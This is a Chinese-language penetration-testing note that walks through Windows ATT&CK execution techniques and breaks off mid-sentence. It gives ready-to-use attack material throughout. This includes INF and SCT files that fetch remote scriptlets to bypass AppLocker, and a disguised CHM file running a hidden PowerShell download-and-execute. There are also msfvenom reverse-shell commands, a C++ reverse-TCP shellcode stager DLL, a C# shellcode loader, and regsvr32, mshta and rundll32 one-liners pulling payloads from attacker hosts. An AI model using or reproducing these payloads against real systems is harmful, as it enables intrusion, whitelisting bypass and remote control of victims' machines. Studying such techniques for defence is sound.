使用CMSTP绕过AppLocker\n\n首先生成一个反弹shell的dll\n\n![1574334298579](Execution.assets/1574334298579.png)\n\n在windows上写入一个INF文件，内容为：\n\n```\n[version]\nSignature=$chicago$\nAdvancedINF=2.5\n\n[DefaultInstall_SingleUser]\nRegisterOCXs=RegisterOCXSection\n\n[RegisterOCXSection]\nC:\\test.dll\n\n[Strings]\nAppAct = \"SOFTWARE\\Microsoft\\Connection Manager\"\nServiceName=\"test\"\nShortSvcName=\"test\"\n```\n\n其中RegisterOCXSection的内容为dll的路径（使用UnRegisterOCXSection可以支持远程文件）\n\n```\n[DefaultInstall_SingleUser]\nUnRegisterOCXs=UnRegisterOCXSection\n \n[UnRegisterOCXSection]\n%11%\\scrobj.dll,NI,http://10.0.0.2/tmp/powersct.sct\n```\n\n然后再MSF上开启监听\n\n![1574334365207](Execution.assets/1574334365207.png)\n\n通过cmstp.exe执行INF\n\n![1574334376470](Execution.assets/1574334376470.png)\n\n此时dll内容成功被执行，反弹shell至MSF\n\n![1574334388885](Execution.assets/1574334388885.png)\n\n作者还提到了一种方法是执行SCT文件，首先通过INF文件使用HTTP远程加载SCT文件，使用的还是WScript\n\n```\n<?XML version=\"1.0\"?>\n<scriptlet>\n<registration \n    progid=\"Pentest\"\n    classid=\"{F0001111-0000-0000-0000-0000FEEDACDC}\" >\n\t<!-- Proof Of Concept - @netbiosX -->\n\t<script language=\"JScript\">\n\t\t<![CDATA[\n\t\t\tvar r = new ActiveXObject(\"WScript.Shell\").Run(\"cmd /k cd c:\\ & testcmstp.exe\");\n\t\t]]>\n</script>\n</registration>\n</scriptlet>\n```\n\n注：这里是直接执行的EXE文件，还有一种方法可以在本机Powershell被禁用的情况下用作执行powershell代码的替代方案：https://gist.github.com/NickTyrer/0604bb9d7bcfef9e0cf82c28a7b76f0f/\n\n然后使用HTTP服务挂起来，MSF生成一个反弹shell的EXE\n\n![1574338928548](Execution.assets/1574338928548.png)\n\n然后使用INF文件调用SCT执行EXE文件。\n\n```\ncmstp.exe /s testhttp.INF\n```\n\n执行之后成功执行testcmstp.exe文件反弹shell\n\n![1574339122693](Execution.assets/1574339122693.png)\n\n但是这是绕过APPLocker的方法，实际上这两个DLL和EXE文件还是需要免杀才能在真正的环境下绕过防护软件，此前Micropoor在GitHub上更新过的。\n\n原文链接：https://pentestlab.blog/2018/05/10/applocker-bypass-cmstp/\n\n## Command-Line Interface\n\n就是cmd…好像没啥说的？\n\n## Compiled HTML File-T1223\n\nCHM文件英语“Compiled Help Manual”的简写，即“已编译的帮助文件”。CHM是微软新一代的帮助文件格式，利用HTML作源文，把帮助内容以类似数据库的形式编译储存。\n\nCHM文档实际是HTML文档经过编译之后的文件格式。我们可以通过CHM文件来触发后门。\n\n### 命令执行\n\n首先生成一个HTML文件，内容为：\n\n```html\n<!DOCTYPE html><html><head><title>Mousejack replay</title><head></head><body>\ncommand exec\n<OBJECT id=x classid=\"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\" width=1 height=1>\n<PARAM name=\"Command\" value=\"ShortCut\">\n <PARAM name=\"Button\" value=\"Bitmap::shortcut\">\n <PARAM name=\"Item1\" value=',calc.exe'>\n <PARAM name=\"Item2\" value=\"273,1,1\">\n</OBJECT>\n<SCRIPT>\nx.Click();\n</SCRIPT>\n</body></html>\n```\n\n使用EasyCHM生成CHM格式文件\n\n![1574410050235](Execution.assets/1574410050235.png)\n\n![1574410056381](Execution.assets/1574410056381.png)\n\n打开TestCHMCalc.CHM可以看到弹出了计算器，也就是说已经执行了calc.exe命令。\n\n![1574410410144](Execution.assets/1574410410144.png)\n\n### MSF shell\n\n使用MSF生成EXE文件(实际上用powershell的base64反弹shell语句应该也是可以的，没测)\n\n![1574410646015](Execution.assets/1574410646015.png)\n\n使用HTTP服务和Powershell远程加载和下载EXE文件，将反弹语句插入CHM\n\n```\npowershell -WindowStyle hidden -nologo -noprofile -ep bypass IEX(New-Object Net.WebClient).DownloadFile('http://<ip address>/testchmshell.exe','..\\\\testchmshell.exe');&cmd/c ..\\\\testchmshell.exe\n```\n\n最终的chm内容为（可以适当加一些迷惑性数据）\n\n```html\n<HTML>\n<TITLE>Check for Windows updates from Command Line</TITLE>\n<HEAD>\n</HEAD>\n<BODY>\n<OBJECT id=x classid=\"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\" width=1 height=1>\n<PARAM name=\"Command\" value=\"ShortCut\">\n <PARAM name=\"Button\" value=\"Bitmap::shortcut\">\n <PARAM name=\"Item1\" value=\",cmd.exe,/c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -nologo -noprofile -ep bypass IEX(New-Object Net.WebClient).DownloadFile('http://<ipaddress> /testchmshell.exe','..\\\\testchmshell.exe');&cmd/c ..\\\\testchmshell.exe\">\n <PARAM name=\"Item2\" value=\"273,1,1\">\n</OBJECT>\n<SCRIPT>\nx.Click();\n</SCRIPT>\n</BODY>\n</HTML>\n```\n\n然后使用EasyCHM编译成CHM文件\n\n![1574414921165](Execution.assets/1574414921165.png)\n\n在目标主机点击即可反弹shell\n\n![1574414943536](Execution.assets/1574414943536.png)\n\n但是这个调用的是CMD，执行的时候会出现CMD的黑色框，后来从网上看的改进版的使用的是rundll32.exe可以避免黑框。无论是cmd还是Rundll32都是调用的Powershell，如果Powershell被禁或者被杀可以尝试WSC，通过wscript运行文件反弹shell，这里不再演示。\n\n## Control Panel Items-T1196\n\nControl Panel Items是控制面板项目，是格式为.cpl的文件。在系统安装目录的system32下面有一系列.cpl文件,它们分别对应着控制面板中的项目\n\nCPL文件是Windows可执行性文件（本质是一个dll文件），但不属于可以直接独立运行的文件，通常由shell32.dll打开。\n\n同时也可以通过VBS脚本或者是js来调用。\n\n生成cpl文件的方法和dll文件相同，只需要将生成的dll后缀名改成cpl即可。\n\n**执行代码：**\n\n例：使用VC++新建一个dll项目生成一个dll.\n\n```c++\n#!c\n#include \"stdafx.h\"\n#include \"Windows.h\"\nBOOL APIENTRY DllMain( HANDLE hModule, \n                       DWORD  ul_reason_for_call, \n                       LPVOID lpReserved\n                     )\n{\n    switch (ul_reason_for_call)\n    {\n        case DLL_PROCESS_ATTACH:\n            WinExec(\"calc.exe\", SW_SHOW);\n        case DLL_THREAD_ATTACH:\n        case DLL_THREAD_DETACH:\n        case DLL_PROCESS_DETACH:\n            break;\n    }\n    return TRUE;\n}\n```\n\n比如这个例子中将代码build之后生成了cpldll.dll\n\n![1574415023128](Execution.assets/1574415023128.png)\n\n改名成为cpldll.cpl之后双击执行了calc.exe(这里是在xp环境下，其他应该没啥区别)\n\n![1574415038409](Execution.assets/1574415038409.png)\n\n**反弹shell：**\n\n使用MSF生成cpl文件:\n\n```\nmsfvenom -p windows/meterpreter/reverse_tcp -b '\\x00\\xff' lhost=192.168.144.176 lport=4444 -f dll -o testcpl.cpl\n```\n\n![1574415051298](Execution.assets/1574415051298.png)\n\n然后转移到目标机器直接双击就会反弹shell回来\n\n![1574415088460](Execution.assets/1574415088460.png)\n\n![1574415092444](Execution.assets/1574415092444.png)\n\n网上看到的文章中说msfvenom生成的文件可能存在程序兼容问题（本人没出现问题），所以提供了一个可以自己编译的代码，这里也贴一下。\n\n```c++\n#!c\n#include \"Windows.h\"\n#include <WinSock2.h>\n#include <stdio.h>  \n \n#pragma comment(lib,\"WS2_32.lib\")   \n \nint reverse_tcp()\n{\n    WSADATA wsData;\n        if(WSAStartup(MAKEWORD(2,2),&wsData))\n        {\n            printf(\"WSAStartp fail.\\n\");\n            return 0;\n        } \n \n        SOCKET sock = WSASocket(AF_INET,SOCK_STREAM,0,0,0,0);\n        SOCKADDR_IN server;\n        ZeroMemory(&server,sizeof(SOCKADDR_IN));\n        server.sin_family = AF_INET;\n        server.sin_addr.s_addr = inet_addr(\"192.168.127.132\"); //server ip\n        server.sin_port = htons(8888); //server port\n        if(SOCKET_ERROR == connect(sock,(SOCKADDR*)&server,sizeof(server)))\n        {\n            printf(\"connect to server fail.\\n\");\n            closesocket(sock);\n            WSACleanup();\n            return 0;\n        } \n \n        u_int payloadLen;\n        if (recv(sock,(char*)&payloadLen,sizeof(payloadLen),0) != sizeof(payloadLen))\n        {\n            printf(\"recv error\\n\");\n            closesocket(sock);\n            WSACleanup();\n            return 0;\n        } \n \n        char* orig_buffer = (char*)VirtualAlloc(NULL,payloadLen,MEM_COMMIT,PAGE_EXECUTE_READWRITE);\n        char* buffer = orig_buffer;\n        int ret = 0;\n        do \n        {\n            ret = recv(sock,buffer,payloadLen,0);\n            buffer += ret;\n            payloadLen -= ret;\n        } while (ret > 0 && payloadLen > 0);  \n \n        __asm\n        {\n            mov edi,sock;   \n            jmp orig_buffer; \n        } \n \n        VirtualFree(orig_buffer,0,MEM_RELEASE);   \n}   \n \nBOOL APIENTRY DllMain( HMODULE hModule,\n                      DWORD  ul_reason_for_call,\n                      LPVOID lpReserved\n                      )\n{\n    switch (ul_reason_for_call)\n    {\n    case DLL_PROCESS_ATTACH:\n        reverse_tcp();\n    case DLL_THREAD_ATTACH:\n    case DLL_THREAD_DETACH:\n    case DLL_PROCESS_DETACH:\n        break;\n    }\n    return TRUE;\n}\n```\n\n参考链接：https://blog.csdn.net/weixin_34232617/article/details/87979961\n\n## Dynamic Data Exchange-T1173\n\n动态数据交换，简称DDE，使用DDE通讯需要两个Windows应用程序，其中一个作为服务器处理信息，另外一个作为客户机从服务器获得信息。\n\n**说白了就是一个协议，用于服务端和客户端的数据交换。**\n\n \n\n由网络上提供的文档等信息可以了解到这个协议的攻击手法主要集中在windows中的office工具中，比如Excel等。\n\n在MSWord和MSExcel中可以使用DDE来执行命令，最初也是国外研究人员提出了通过DDE来绕过开启宏的限制。\n\n首先新建一个Word文档\n\n新建一个Word文档，通过**Ctrl+F9**添加一个域，然后修改域代码为\n\n```\n{ DDEAUTO \"c:\\\\windows\\\\system32\\\\cmd.exe\" \"/k notepad.exe\" }\n```\n\n“DDEAUTO”关键字指示Word这是一个DDE域，并且在打开文档时自动执行域代码。在域代码中，紧跟“DDEAUTO”关键字后面的是要执行的可执行程序的路径，后面跟随的是可执行程序的参数。\n\n关键字除了DDEAUTO之外也可以使用DDE：\n\n```\n{ DDE \"c:\\\\windows\\\\system32\\\\cmd.exe\" \"/k notepad.exe\" }\n```\n\n不过DDE字段不会自动运行（右键输入的DDE代码选择域属性，勾选Preserve fomatting during updates）\n\n这个文章里还提到了使用DDE插入Word文档进行反弹Empire shell的方式，环境中没有安装office，所以没有实验。\n\n参考链接：https://www.freebuf.com/articles/system/153105.html\n\n## Execution through API-T1106\n\n一些工具可以通过windows API来执行二进制文件，例如Windows API  CreateProcess之类的函数将允许程序和脚本使用正确的路径和参数启动其他进程。\n\n可用于执行二进制文件的其他Windows API调用包括：\n\n```\nCreateProcessA() and CreateProcessW(),\nCreateProcessAsUserA() and CreateProcessAsUserW(),\nCreateProcessInternalA() and CreateProcessInternalW(),\nCreateProcessWithLogonW(), CreateProcessWithTokenW(),\nLoadLibraryA() and LoadLibraryW(),\nLoadLibraryExA() and LoadLibraryExW(),\nLoadModule(),\nLoadPackagedLibrary(),\nWinExec(),\nShellExecuteA() and ShellExecuteW(),\nShellExecuteExA() and ShellExecuteExW()\n```\n\n## 未完成Execution through Module Load-T1129\n\n可以指示Windows模块加载程序从任意本地路径和任意通用命名约定（UNC）网络路径加载DLL。这个功能使用的是系统中的NTDLL.dll。\n\n攻击者可以使用此功能作为在系统上执行任意代码的方法。（？？？）\n\n## Exploitation for Client Execution-T1203\n\n这个主要说了通过一些软件，比如钓鱼页面、Office等还有Flash的漏洞等来执行。\n\n## Graphical User Interface-T1061\n\n图形用户界面（GUI）是与操作系统交互的常用方式。攻击者可以在操作期间使用系统的GUI，通常通过远程交互式会话（如远程桌面协议），而不是通过命令行界面，通过鼠标双击事件搜索信息和执行文件，Windows运行命令[ 1]，或其他可能难以监控的交互。\n\n主要就是提到了通过例如RDP协议进行的执行命令。\n\n## InstallUtil-T1118\n\nInstallUtil是一个命令行实用程序，它允许通过执行.NET二进制文件中指定的特定安装程序组件来安装和卸载资源。InstallUtil位于Windows系统上的.NET目录中：和InstallUtil.exe由Microsoft进行数字签名。\n\n在系统中的位置是：\n\n```\nC:\\Windows\\Microsoft.NET\\Framework64\\vXXX\\InstallUtil.exe\n```\n\n可以通过InstallUtil执行命令，可以算是基于白名单的一种执行方法。\n\n官网有命令说明：\n\nhttps://docs.microsoft.com/zh-cn/dotnet/framework/tools/installutil-exe-installer-tool\n\n**使用InstallUitl执行shellcode反弹shell**\n\n使用msfvenom生成shellcode\n\n```\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.144.176 LPORT=4444 -f csharp > TestInstallUtil.cs\n```\n\n![1574416138279](Execution.assets/1574416138279.png)\n\n然后加入C#代码组合成能够编译的C#，已经有做好的框架：\n\nhttps://gist.githubusercontent.com/lithackr/b692378825e15bfad42f78756a5a3260/raw/b049d539be7e84afa7abecf143ab393cb158322a/InstallUtil-Shellcode-cs\n\n![1574416162988](Execution.assets/1574416162988.png)\n\n使用csc.exe编译成dll或者exe文件。\n\n```\nC:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\csc.exe /unsafe /platform:x86 /out:TestInstallUtil.exe .\\InstallUtilC.cs\n```\n\n![1574416185030](Execution.assets/1574416185030.png)\n\n然后使用InstallUtil.exe文件执行生成的TestInstallUtil.exe\n\n```\nC:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\InstallUtil.exe /logfile= /LogToConsole=false /U .\\TestInstallUtil.exe\n```\n\n![1574416218736](Execution.assets/1574416218736.png)\n\n反弹shell成功：\n\n![1574416230389](Execution.assets/1574416230389.png)\n\n## Launchctl-T1152\n\nMACOS\n\n## Local Job Scheduling-T1168\n\n主要说明了在Linux和MACOS下的定时任务命令crontab使用，可以在Linux下直接crontab -h查看使用帮助，或者参考网站上的使用方法：https://www.runoob.com/linux/linux-comm-crontab.html\n\n## LSASS Driver-T1177\n\nWindows安全子系统是一组用于管理和实施计算机或域的安全策略的组件。本地安全机构（LSA）是负责本地安全策略和用户身份验证的主要组件。LSA包括与各种其他安全功能相关联的多个动态链接库（DLL），所有这些功能都在LSA子系统服务（LSASS）lsass.exe进程的上下文中运行。\n\n然而怎么执行？\n\n## MSHTA-T1170\n\n### 介绍：\n\nMshta.exe是一个执行Microsoft HTML应用程序（HTA）的实用程序。HTA文件后缀为.hta，全称是HTML APPlication。MSF已经自带利用的模块\n\n可以直接使用MSF生成HTA文件：\n\n```\nmsfvenom -p windows/shell/reverse_tcp lhost=192.168.144.176 lport=4444 -f hta-psh -o testhta.hta\n```\n\n![1574416472065](Execution.assets/1574416472065.png)\n\n生成的HTA文件内容：\n\n```\n<script language=\"VBScript\">                                                                                                                                                                                                     </script>\n```\n\n然后可以通过mshta来执行，可远程执行，还有Koadic等工具也可以生成HTA文件。\n\n### 直接使用MSF反弹shell：\n\nMSF执行：\n\n```\nuse exploit/windows/misc/hta_server\nset srvhost 10.32.11.122\n\nexploit\n```\n\n![1576565526982](Execution.assets/1576565526982.png)\n\n目标主机：\n\n```\nmshta http://192.168.144.176:8080/OaDQ6u.hta\n```\n\n## Powershell-T1086\n\n提到了Empire、PowerSploit和PSAttack等框架，Powershell能执行的太多了，不写了。\n\n## Regsvcs/Regasm-T1121\n\nRegsvcs和Regasm分别是.NET服务安装工具和程序集注册工具。\n\nRegsvcs（.NET服务安装工具）执行下列操作：\n\n```\n加载并注册程序集\n生成注册类型库并将其安装到指定的COM+应用程序中\n配置以编程方式添加到类的服务\n```\n\n![1574417370895](Execution.assets/1574417370895.png)\n\nRegasm（程序集注册工具）\n\n​    程序集注册工具读取程序集中的元数据，并将必要的条目添加到注册表，这允许COM客户端透明的创建.NET Framework类。\n\n![1574417392929](Execution.assets/1574417392929.png)\n\n这两个程序的利用一般是用来绕过APPLocker白名单的限制。不过默认情况下这两个命令是没有加入到环境变量里的，需要使用绝对路径来运行。\n\n![1574417401674](Execution.assets/1574417401674.png)\n\n反弹shell：\n\n```\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.144.176 LPORT=4444 -f csharp > TestInstallUtil.cs\n```\n\n使用msfvenom生成shellcode（这里用的是上文中InstallUtil实验的shellcode，没区别）\n\n![1574416138279](Execution.assets/1574416138279.png)\n\n然后加入C#代码组合成能够编译的C#，已经有做好的框架：\n\nhttps://github.com/3gstudent/Bypass-McAfee-Application-Control--Code-Execution/blob/master/regsvcs.cs\n\n```c#\nusing System;\nusing System.EnterpriseServices;\nusing System.Runtime.InteropServices;\n\n/*\nAuthor: Casey Smith, Twitter: @subTee\nLicense: BSD 3-Clause\nCreate Your Strong Name Key -> key.snk\n$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='\n$Content = [System.Convert]::FromBase64String($key)\nSet-Content key.snk -Value $Content -Encoding Byte\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library /out:regsvcs.dll /keyfile:key.snk regsvcs.cs\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe regsvcs.dll \n[OR]\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe regsvcs.dll\n//Executes UnRegisterClass If you don't have permissions\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe /U regsvcs.dll \nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U regsvcs.dll\n//This calls the UnregisterClass Method\n*/\nnamespace regsvcser\n{\n    \n    public class Bypass : ServicedComponent\n    {\n        public Bypass() { Console.WriteLine(\"I am a basic COM Object\"); }\n\t\t\n\t\t[ComRegisterFunction] //This executes if registration is successful\n\t\tpublic static void RegisterClass ( string key )\n\t\t{\n\t\t\tConsole.WriteLine(\"I shouldn't really execute\");\n\t\t\tShellcode.Exec();\n\t\t}\n\t\t\n\t\t[ComUnregisterFunction] //This executes if registration fails\n\t\tpublic static void UnRegisterClass ( string key )\n\t\t{\n\t\t\tConsole.WriteLine(\"I shouldn't really execute either.\");\n\t\t\tShellcode.Exec();\n\t\t}\n    }\n\t\n\tpublic class Shellcode\n    {\n        public static void Exec()\n        {\n            // native function's compiled code\n            // generated with metasploit\n            // executes calc.exe\n            byte[] shellcode = new byte[193] {\n\t\t\t0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,\n\t\t\t0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,\n\t\t\t0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,\n\t\t\t0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,\n\t\t\t0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,\n\t\t\t0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,\n\t\t\t0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,\n\t\t\t0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,\n\t\t\t0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,\n\t\t\t0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,\n\t\t\t0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,\n\t\t\t0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,\n\t\t\t0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };\n\n            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);\n            IntPtr hThread = IntPtr.Zero;\n            UInt32 threadId = 0;\n            // prepare data\n\n\n            IntPtr pinfo = IntPtr.Zero;\n\n            // execute native code\n\n            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\n            WaitForSingleObject(hThread, 0xFFFFFFFF);\n            return;\n        }\n\n        private static UInt32 MEM_COMMIT = 0x1000;\n\n        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\n        [DllImport(\"kernel32\")]\n        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n\n        [DllImport(\"kernel32\")]\n        private static extern IntPtr CreateThread(\n          UInt32 lpThreadAttributes,\n          UInt32 dwStackSize,\n          UInt32 lpStartAddress,\n          IntPtr param,\n          UInt32 dwCreationFlags,\n          ref UInt32 lpThreadId\n          );\n\n        [DllImport(\"kernel32\")]\n        private static extern UInt32 WaitForSingleObject(\n          IntPtr hHandle,\n          UInt32 dwMilliseconds\n          );\n    }\n}\n```\n\n直接替换上面代码中的shellcode部分，然后使用sn.exe生成密钥(关于sn.exe可以参考https://docs.microsoft.com/zh-cn/dotnet/framework/tools/sn-exe-strong-name-tool?redirectedfrom=MSDN)：\n\n![1574417624261](Execution.assets/1574417624261.png)\n\n然后编译成exe或者dll文件，即可使用\n\n```\nC:\\Users\\Administrator\\Desktop>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library /out:testRegsvcs.dll /keyfile:key.snk testregsvcs.cs\n```\n\n![1574418828978](Execution.assets/1574418828978.png)\n\n直接使用regsvcs.exe运行dll文件\n\n![1574418839904](Execution.assets/1574418839904.png)\n\n执行之后会反弹shell\n\n![1574418847052](Execution.assets/1574418847052.png)\n\n## REGSVR32-T1117\n\nRegsvr32.exe是一个命令行程序，用于在Windows系统上注册和取消注册对象链接和嵌入控件，包括动态链接库（DLL）。Regsvr32.exe可用于执行任意二进制文件。主要也是躲避检测，windows正常使用regsvr32.exe可能会触发检测系统的误报。\n\n使用MSF的server/regsvr32_command_delivery_server模块能够通过regsvr32执行命令\n\n```\nse auxiliary/server/regsvr32_command_delivery_server\nset CMD net user testreg testreg /add\nexploit\n```\n\n![1574418910067](Execution.assets/1574418910067.png)\n\n直接执行：\n\n```\nregsvr32 /s /n /u /i:http://192.168.144.176:8080/rdIbhY scrobj.dll\n```\n\n![1574418984609](Execution.assets/1574418984609.png)\n\n这里是直接照着Micropoor的文章里执行的创建用户的命令，在MSF中使用有回显的命令时发现会报错，实际可以直接执行反弹shell的dll文件。\n\n### 直接反弹shell\n\nMSF：\n\n```\nuse exploit/multi/script/web_delivery\nset target 3\nset payload windows/meterpreter/reverse_tcp\nset lhost 192.168.144.176\nset srvhost 192.168.144.176\nexploit\n```\n\n![1576566949215](Execution.assets/1576566949215.png)\n\n目标主机执行：\n\n```\nregsvr32 /s /n /u /i:http://192.168.144.176:8080/ZdmFgyl2Hz.sct scrobj.dll\n```\n\n但是执行之后发现都出现了错误，猜测是64位的原因？：\n\n![1576567010173](Execution.assets/1576567010173.png)\n\n## Rundll32-T1085\n\n### 简介：\n\nrundll32.exe程序可以用来执行任意二进制文件。攻击者可以利用此功能来代理代码的执行，以避免触发可能无法监视rundll32.exe进程执行的安全工具，因为Windows使用rundll32.exe进行正常操作时出现白名单或误报。\n\n几种执行方式：\n\n```\n本地：\nrundll32 shell32.dll,Control_RunDLL C:\\test.dll\n通过UNC路径调用：\nrundll32.exe \\\\192.168.1.107\\ZtmW\\test.dll,0\n通过js调用：\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();GetObject(\"script:http://192.168.1.4/Rundll32_shellcode\")\n\n```\n\n### 使用MSF反弹shell\n\nmsf:\n\n```\nuse exploit/windows/smb/smb_delivery\nset srvhost 192.168.144.176\nexploit\n```\n\n![1576565842918](Execution.assets/1576565842918.png)\n\n目标主机执行：\n\n```\nrundll32.exe \\\\192.168.144.176\\XzuN\\test.dll,0\n```\n\n## （未完成）Scheduled Task-T1053\n\n即通过计划任务进行执行指定文件，不过感觉这种方式一般可能会用来运行后门文件\n\n## Scripting-T1064\n\n脚本？同样是概念的一个点，提到了powershell和VB等等很多其他的脚本。\n\n## Service Execution-T1035\n\n在windows中可以把程序注册成为一个服务来执行，可以通过创建新服务或者是修改现有服务来完成。\n\n如果是创建一个新的服务，则需要使用sc.exe（Service Control）进行创建。\n\n```\nsc.exe create testsca binpath= c:\\users\\Administrator\\Desktop\\a.exe\n```\n\n![1574753720810](Execution.assets/1574753720810.png)\n\n创建之后可以看到已经新建了名称为testsca的\n\n![1574754760399](Execution.assets/1574754760399.png)\n\n可以看到已经创建的服务，但是服务起起来会出现问题，看到网上说的原因是被注册为服务的exe文件需要有特定的格式，但是因为不是很熟悉Windows下的API编程，所以这里用C#进行了尝试。具体的使用VS2017生成一个服务exe的文件可以参考链接：\n\nhttps://www.jb51.net/article/124723.htm\n\nhttps://docs.microsoft.com/zh-cn/dotnet/framework/windows-services/walkthrough-creating-a-windows-service-application-in-the-component-designer\n\n代码内容：\n\n```C#\nusing System;\nusing System.Collections.Generic;\nusing System.ComponentModel;\nusing System.Data;\nusing System.Diagnostics;\nusing System.Linq;\nusing System.ServiceProcess;\n\nnamespace WindowsService1\n{\n    public partial class TestAttckService : ServiceBase\n    {\n        public TestAttckService()\n        {\n            InitializeComponent();\n        }\n\n        protected override void OnStart(string[] args)\n        {\n            ProcessStartInfo test_calc = new ProcessStartInfo(\"calc.exe\");\n            Process calc = new Process();\n            calc.StartInfo = test_calc;\n            calc.Start();\n        }\n\n        protected override void OnStop()\n        {\n            ProcessStartInfo test_calc = new ProcessStartInfo(\"calc.exe\");\n            Process calc = new Process();\n            calc.StartInfo = test_calc;\n            calc.Start();\n        }\n    }\n}\n```\n\n直接执行可以看到错误\n\n![1574757469614](Execution.assets/1574757469614.png)\n\n也就是说是需要InstallUtil.exe文件来进行安装服务（和上文中的区别是这个是用于安装服务的）\n\n```\nc:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe E:\\3_C\\C#\\WindowsService1\\WindowsService1\\bin\\Debug\\WindowsService1.exe\n```\n\n![1574762535816](Execution.assets/1574762535816.png)\n\n这里提示安装成功，之后可以在服务中看到对应的服务，不过在使用ProcessStartInfo创建新进程的时候发现并不能成功，执行命令也不能成功。\n\n![1574762565496](Execution.assets/1574762565496.png)\n\n随后将OnStart方法的代码改成了上文中网站中提供的代码（打印日志的代码）：\n\n```\nprotected override void OnStart(string[] args) \n{\n\tusing (System.IO.StreamWriter sw = new System.IO.StreamWriter(\"C:\\\\log.txt\", true)) \n\t{\n\t\tsw.WriteLine(DateTime.Now.ToString(\"yyyy-MM-dd HH:mm:ss \") + \"Start.\");\n\t}\n}\n```\n\n之后发现能够成功在C盘中输出log.txt。没有执行命令成功的原因就没有再跟。\n\n### 使用CS创建新服务\n\n在已经创建的Beacon中上传exe文件，并创建服务\n\n```\ncd \\\\win2012\\c$\nupload c:\\users\\xxm\\desktop\\artfact.exe\nrun sc create \"beaconPen\" binpath= \"cmd /c start \"C:\\artifact.exe\"\"&&sc config \"beaconPen\" start= auto&&net start  beaconPn\n```\n\n## Signed Binary Proxy Execution-T1218\n\n使用可信数字证书签名的二进制文件可以在受数字签名验证保护的Windows系统上执行。攻击者可能会滥用此行为来执行可能绕过系统上的应用程序白名单和签名验证的恶意文件。\n\n### msiexec.exe\n\nmsiexec.exe默认位置在C:\\Windows\\System32\\和C:\\Windows\\SysWOW64\\。Msiexec.exe是Windows 